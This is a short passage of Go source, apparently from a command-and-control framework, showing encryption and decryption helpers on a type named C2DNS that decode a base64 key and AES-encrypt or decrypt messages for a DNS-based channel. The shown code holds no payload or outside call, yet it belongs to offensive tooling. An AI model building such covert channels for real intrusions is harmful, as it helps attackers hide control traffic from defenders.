	return crypto.AesEncrypt(key, msg)
}

func (c *C2DNS) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
